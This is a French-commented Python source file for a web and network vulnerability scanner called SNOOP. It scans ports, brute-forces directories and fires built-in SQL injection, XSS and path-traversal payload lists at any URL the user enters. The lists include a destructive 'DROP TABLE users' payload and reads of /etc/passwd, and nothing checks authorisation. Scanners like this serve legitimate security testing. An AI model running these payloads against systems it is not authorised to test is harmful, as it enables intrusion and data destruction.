#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SNOOP Advanced Vulnerability Scanner v2.0
# Module professionnel – Web + Réseau + Brute Force

import os
import sys
import re
import time
import socket
import threading
import requests
import urllib.parse
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor
import ipaddress
import json
import hashlib
from datetime import datetime
import random

# --- Vérification et installation des dépendances ---
try:
    import colorama
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama -q")
    from colorama import init, Fore, Style
    init(autoreset=True)

# ================================================================
# 1. CONFIGURATION
# ================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/126.0",
]

COMMON_PORTS = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1080,1433,1521,1723,3306,3389,5432,5900,6379,8080,8443,27017]

# Wordlists intégrées pour le brute force des répertoires
DIR_WORDLIST = [
    "admin", "login", "wp-admin", "wp-login", "administrator", "backup", "backups",
    "config", ".env", ".git", ".svn", ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml",
    "phpmyadmin", "mysql", "webmail", "mail", "cpanel", "whm", "server-status",
    "info", "phpinfo", "test", "dev", "upload", "uploads", "files", "download",
    "assets", "static", "css", "js", "img", "images", "vendor", "node_modules",
    "composer", "package.json", "yarn.lock", "aws", "s3", "bucket", "private",
    "secret", "hidden", "internal", "debug", "health", "ping", "status", "metrics",
    "prometheus", "swagger", "docs", "doc", "help", "support", "contact", "about",
    "products", "shop", "cart", "checkout", "payment", "invoice", "user", "profile",
    "settings", "account", "logout", "register", "forum", "blog", "news", "press",
    "media", "video", "audio", "downloads", "wp-content", "wp-includes",
    "cgi-bin", "cgi", "pl", "perl", "scripts", "test.php", "test.asp", "test.aspx",
    "test.jsp", "index.php", "index.html", "default.asp", "default.aspx",
    "home", "main", "portal", "dashboard", "panel", "console", "system", "sys",
    "kernel", "proc", "dev", "mnt", "media", "tmp", "temp", "logs", "log",
    "error_log", "access_log", "db", "database", "sql", "dump", "export", "backup.sql"
]

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    "') OR ('1'='1", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' AND 1=1--", "' AND 1=2--", "' OR SLEEP(5)--",
    "'; DROP TABLE users--", "') OR 1=1--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input type='text' value='XSS' onfocus=alert('XSS')>",
    "'';!--\"<XSS>=&{()}"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../boot.ini",
    "../../../../windows/win.ini",
    "../../../../../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../../proc/self/environ",
    "../../../../../../../../var/log/apache2/access.log"
]

# ================================================================
# 2. CLASSES ET FONCTIONS UTILITAIRES
# ================================================================

class Vulnerability:
    def __init__(self, name, url, description, severity="Medium", evidence=""):
        self.name = name
        self.url = url
        self.description = description
        self.severity = severity  # Critical, High, Medium, Low, Info
        self.evidence = evidence
        self.timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def to_dict(self):
        return {
            "name": self.name,
            "url": self.url,
            "description": self.description,
            "severity": self.severity,
            "evidence": self.evidence,
            "timestamp": self.timestamp
        }

class VulnScanner:
    def __init__(self, target, threads=20, timeout=5, user_agent=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.user_agent = user_agent or random.choice(USER_AGENTS)
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": self.user_agent})
        self.results = []  # Liste de Vulnerability
        self.lock = threading.Lock()
        self.found_dirs = set()
        self.port_results = {}

    def _get(self, url, params=None, headers=None, allow_redirects=True, verify=False):
        """Effectue une requête GET avec gestion des erreurs."""
        try:
            resp = self.session.get(url, params=params, headers=headers,
                                    timeout=self.timeout, allow_redirects=allow_redirects,
                                    verify=verify)
            return resp
        except requests.exceptions.RequestException as e:
            return None

    def _post(self, url, data=None, headers=None, verify=False):
        try:
            resp = self.session.post(url, data=data, headers=headers,
                                     timeout=self.timeout, verify=verify)
            return resp
        except:
            return None

    def _normalize_url(self, url):
        """Assure que l'URL a un protocole et un slash final si nécessaire."""
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        return url.rstrip('/') + '/'

    def _get_base_domain(self):
        parsed = urlparse(self.target)
        return f"{parsed.scheme}://{parsed.netloc}"

    def _add_result(self, vuln):
        with self.lock:
            self.results.append(vuln)

    def print_result(self, vuln):
        color_map = {
            "Critical": Fore.RED + Style.BRIGHT,
            "High": Fore.RED,
            "Medium": Fore.YELLOW,
            "Low": Fore.CYAN,
            "Info": Fore.WHITE
        }
        color = color_map.get(vuln.severity, Fore.WHITE)
        print(f"{color}[{vuln.severity}] {vuln.name} : {vuln.url}{Style.RESET_ALL}")
        if vuln.evidence:
            print(f"    {Fore.DIM}{vuln.evidence[:200]}{Style.RESET_ALL}")

    # ============================================================
    # 3. SCAN DE PORTS AVANCÉ
    # ============================================================

    def scan_port(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                service = self._get_service_name(port)
                return port, service
        except:
            pass
        return None, None

    def _get_service_name(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 111: "RPC", 135: "MSRPC", 139: "NetBIOS",
            143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS", 995: "POP3S",
            1080: "SOCKS", 1433: "MSSQL", 1521: "Oracle", 1723: "PPTP",
            3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
            6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 27017: "MongoDB"
        }
        return services.get(port, "Unknown")

    def run_port_scan(self, ip, ports=None):
        print(f"{Fore.CYAN}[*] Starting port scan on {ip}...{Style.RESET_ALL}")
        if ports is None:
            ports = COMMON_PORTS
        results = {}
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.scan_port, ip, p): p for p in ports}
            for future in futures:
                port, service = future.result()
                if port:
                    results[port] = service
        self.port_results = results
        return results

    # ============================================================
    # 4. DÉTECTION DE SERVEUR ET TECHNOLOGIES
    # ============================================================

    def detect_server_info(self, url):
        resp = self._get(url)
        if not resp:
            return
        server = resp.headers.get("Server", "Unknown")
        powered_by = resp.headers.get("X-Powered-By", "Unknown")
        tech = []
        if "PHP" in powered_by:
            tech.append("PHP")
        if "ASP.NET" in powered_by or "ASP.NET" in server:
            tech.append("ASP.NET")
        if "nginx" in server.lower():
            tech.append("nginx")
        if "Apache" in server:
            tech.append("Apache")
        if "IIS" in server:
            tech.append("IIS")
        # Détection via meta
        if resp.text and "wp-content" in resp.text.lower():
            tech.append("WordPress")
        if resp.text and "Drupal" in resp.text:
            tech.append("Drupal")
        if resp.text and "Joomla" in resp.text:
            tech.append("Joomla")
        info = f"Server: {server} | Powered-By: {powered_by} | Technologies: {', '.join(tech) if tech else 'None'}"
        vuln = Vulnerability("Server Information", url, info, severity="Info")
        self._add_result(vuln)
        self.print_result(vuln)

    # ============================================================
    # 5. SCAN DE RÉPERTOIRES (Brute Force)
    # ============================================================

    def brute_directories(self, base_url, wordlist=None):
        if wordlist is None:
            wordlist = DIR_WORDLIST
        print(f"{Fore.CYAN}[*] Directory brute force on {base_url}...{Style.RESET_ALL}")
        found = []

        def check_dir(path):
            full_url = urljoin(base_url, path)
            resp = self._get(full_url)
            if resp and resp.status_code == 200:
                found.append(path)
                with self.lock:
                    print(f"{Fore.GREEN}[+] Found: {full_url}{Style.RESET_ALL}")
                # Vérifier si le répertoire liste les fichiers
                if "Index of" in resp.text or "Directory listing" in resp.text:
                    vuln = Vulnerability("Directory Listing", full_url,
                                         "Directory listing enabled.", severity="Medium")
                    self._add_result(vuln)
                    self.print_result(vuln)
            elif resp and resp.status_code == 403:
                # Forbidden peut indiquer que le répertoire existe
                with self.lock:
                    print(f"{Fore.YELLOW}[!] Forbidden: {full_url}{Style.RESET_ALL}")
                vuln = Vulnerability("Forbidden Directory", full_url,
                                     "Directory exists but access is forbidden.", severity="Low")
                self._add_result(vuln)
                self.print_result(vuln)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(check_dir, wordlist)
        return found

    # ============================================================
    # 6. SQL INJECTION (GET parameters)
    # ============================================================

    def test_sqli(self, url, params):
        for param, value in params.items():
            original = value
            for payload in SQLI_PAYLOADS:
                test_params = params.copy()
                test_params[param] = value + payload
                test_url = url + "?" + urllib.parse.urlencode(test_params)
                resp = self._get(test_url)
                if resp:
                    # Vérifier les erreurs SQL
                    sql_errors = [
                        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
                        "SQLite", "Microsoft OLE DB", "Unclosed quotation mark",
                        "You have an error in your SQL", "Warning: mysql"
                    ]
                    for error in sql_errors:
                        if error.lower() in resp.text.lower():
                            vuln = Vulnerability("SQL Injection", test_url,
                                                 f"Parameter '{param}' seems vulnerable with payload '{payload}'",
                                                 severity="Critical", evidence=error)
                            self._add_result(vuln)
                            self.print_result(vuln)
                            break
                # Test de délai (Time-based blind)
                if "SLEEP" in payload or "DELAY" in payload:
                    start = time.time()
                    resp = self._get(test_url)
                    elapsed = time.time() - start
                    if elapsed >= 4:
                        vuln = Vulnerability("SQL Injection (Time-based)", test_url,
                                             f"Parameter '{param}' caused delay of {elapsed:.1f}s",
                                             severity="High", evidence=f"Delay: {elapsed:.1f}s")
                        self._add_result(vuln)
                        self.print_result(vuln)

    # ============================================================
    # 7. XSS (Cross-Site Scripting)
    # ============================================================

    def test_xss(self, url, params):
        for param, value in params.items():
            for payload in XSS_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                test_url = url + "?" + urllib.parse.urlencode(test_params)
                resp = self._get(test_url)
                if resp and payload in resp.text:
                    vuln = Vulnerability("Cross-Site Scripting (XSS)", test_url,
                                         f"Parameter '{param}' reflects payload.",
                                         severity="High", evidence=payload)
                    self._add_result(vuln)
                    self.print_result(vuln)
                    break

    # ============================================================
    # 8. LFI (Local File Inclusion)
    # ============================================================

    def test_lfi(self, url, params):
        for param, value in params.items():
            for payload in LFI_PAYLOADS:
                test_params = params.copy()
                test_params[param] = payload
                test_url = url + "?" + urllib.parse.urlencode(test_params)
                resp = self._get(test_url)
                if resp:
                    # Vérifier la présence de contenu de fichier système
                    patterns = [
                        "root:", "bin:", "boot.ini", "windows", "win.ini",
                        "passwd", "shadow", "hosts", "localhost"
                    ]
                    for pattern in patterns:
                        if pattern in resp.text.lower():
                            vuln = Vulnerability("Local File Inclusion (LFI)", test_url,
                                                 f"Parameter '{param}' can read files.",
                                                 severity="Critical", evidence=f"Contains '{pattern}'")
                            self._add_result(vuln)
                            self.print_result(vuln)
                            break

    # ============================================================
    # 9. SCAN COMPLET
    # ============================================================

    def run_full_scan(self):
        target = self._normalize_url(self.target)
        base = self._get_base_domain()

        print(f"{Fore.MAGENTA}╔══════════════════════════════════════════╗")
        print(f"║   SNOOP VULNERABILITY SCANNER v2.0   ║")
        print(f"╚══════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Target: {target}{Style.RESET_ALL}\n")

        # 1. Port scan
        try:
            parsed = urlparse(target)
            ip = socket.gethostbyname(parsed.netloc)
            ports = self.run_port_scan(ip)
            if ports:
                print(f"{Fore.GREEN}[+] Open ports: {', '.join(f'{p}({s})' for p,s in ports.items())}{Style.RESET_ALL}")
                # Ajouter les ports ouverts comme info
                port_info = ", ".join(f"{p}({s})" for p,s in ports.items())
                vuln = Vulnerability("Open Ports", ip, f"Open ports: {port_info}", severity="Info")
                self._add_result(vuln)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Port scan failed: {e}{Style.RESET_ALL}")

        # 2. Server info
        self.detect_server_info(target)

        # 3. Brute force directories
        self.brute_directories(target)

        # 4. Test sur les paramètres GET
        parsed = urlparse(target)
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            params = {k: v[0] for k, v in params.items()}
            if params:
                self.test_sqli(target, params)
                self.test_xss(target, params)
                self.test_lfi(target, params)

        # 5. Tester les formulaires POST (simplifié)
        # On va chercher la page d'accueil et chercher des formulaires
        resp = self._get(target)
        if resp:
            forms = re.findall(r'<form[^>]+action=["\']([^"\']*)["\'][^>]*>', resp.text, re.I)
            if forms:
                print(f"{Fore.YELLOW}[!] Found {len(forms)} form(s). Testing basic injection...{Style.RESET_ALL}")
                for action in forms:
                    form_url = urljoin(target, action)
                    for payload in SQLI_PAYLOADS[:3]:
                        data = {"test": payload}
                        post_resp = self._post(form_url, data=data)
                        if post_resp and "error" in post_resp.text.lower():
                            vuln = Vulnerability("SQL Injection (POST)", form_url,
                                                 f"Form action {action} seems vulnerable with payload '{payload}'",
                                                 severity="High", evidence="SQL error found")
                            self._add_result(vuln)
                            self.print_result(vuln)
                            break

        # 6. Rapport final
        self.generate_report()

    # ============================================================
    # 10. GÉNÉRATION DE RAPPORT
    # ============================================================

    def generate_report(self):
        print(f"\n{Fore.MAGENTA}╔══════════════════════════════════════════╗")
        print(f"║         SCAN COMPLETED               ║")
        print(f"╚══════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total vulnerabilities found: {len(self.results)}{Style.RESET_ALL}")

        if self.results:
            # Compter par sévérité
            severities = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Info": 0}
            for v in self.results:
                severities[v.severity] = severities.get(v.severity, 0) + 1

            print(f"{Fore.RED}Critical: {severities['Critical']}{Style.RESET_ALL}")
            print(f"{Fore.RED}High: {severities['High']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Medium: {severities['Medium']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Low: {severities['Low']}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}Info: {severities['Info']}{Style.RESET_ALL}")

            # Sauvegarder le rapport en JSON
            os.makedirs("output/vuln_reports", exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            report_file = f"output/vuln_reports/vuln_report_{timestamp}.json"
            with open(report_file, "w", encoding="utf-8") as f:
                json.dump([v.to_dict() for v in self.results], f, indent=2, ensure_ascii=False)
            print(f"{Fore.GREEN}[+] Report saved to: {report_file}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No vulnerabilities found.{Style.RESET_ALL}")

        input(f"{Fore.CYAN}\nPress Enter to return...{Style.RESET_ALL}")

# ================================================================
# 11. INTERFACE PRINCIPALE
# ================================================================

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.MAGENTA}")
    print("  ╔══════════════════════════════════════════╗")
    print("  ║   SNOOP VULNERABILITY SCANNER v2.0      ║")
    print("  ║          Web + Network + Brute           ║")
    print("  ╚══════════════════════════════════════════╝")
    print(Style.RESET_ALL)

    target = input(f"{Fore.CYAN}  Target URL (ex: https://example.com) : {Style.RESET_ALL}").strip()
    if not target:
        print(f"{Fore.RED}[!] Target required.{Style.RESET_ALL}")
        input("Press Enter...")
        return

    try:
        threads = int(input(f"{Fore.CYAN}  Threads (20): {Style.RESET_ALL}") or 20)
        timeout = int(input(f"{Fore.CYAN}  Timeout (5): {Style.RESET_ALL}") or 5)
    except:
        threads = 20
        timeout = 5

    scanner = VulnScanner(target, threads=threads, timeout=timeout)
    scanner.run_full_scan()

if __name__ == "__main__":
    main()